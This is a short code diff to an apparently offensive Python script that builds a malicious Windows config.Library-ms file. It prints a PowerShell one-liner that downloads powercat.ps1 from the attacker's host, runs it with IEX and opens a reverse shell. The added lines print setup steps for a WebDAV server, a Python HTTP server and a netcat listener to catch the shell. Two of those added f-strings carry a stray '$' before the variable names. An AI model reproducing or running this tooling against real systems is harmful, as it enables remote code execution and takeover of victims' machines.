@@ -49,3 +49,7 @@ with open('config.Library-ms', 'w') as f:
 print('File saved to ./config.Library-ms.\n')
 print('Inject the following command in location field when creating shortcut file:\n')
 print(f'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://{lhost}:8000/powercat.ps1\'); powercat -c {lhost} -p {lport} -e powershell"')
+print("Copy your shortcut file to this folder and start WebDAV, Python3 HTTP server and netcat listener:")
+print(f"wsgidav --host {lhost} --port 80 --auth anonymous --root .")
+print(f"python3 -m http.server -b ${lhost}")
+print(f"nc -nlvp ${lport}")
